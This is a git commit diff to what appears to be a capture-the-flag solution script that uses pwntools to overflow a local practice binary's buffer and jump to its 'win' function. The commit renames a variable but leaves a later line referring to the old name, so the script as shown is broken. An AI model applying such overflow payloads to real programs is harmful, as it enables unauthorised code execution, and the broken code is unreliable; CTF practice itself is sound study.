1ef14bb8827b56d07e7359cbaa84e06b47426ac8
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-05 20:04:08 -0400

    Update 02.py

--- chall_02/02.py
+++ chall_02/02.py
@@ -1,5 +1,5 @@
 from pwn import *
-elf= context.binary = ELF("./withoutpie")
+binary= context.binary = ELF("./withoutpie")
 p = process(binary.path)
 p.sendline((0x71+0x4)*b'A' + p32(elf.sym.win))
 p.interactive()
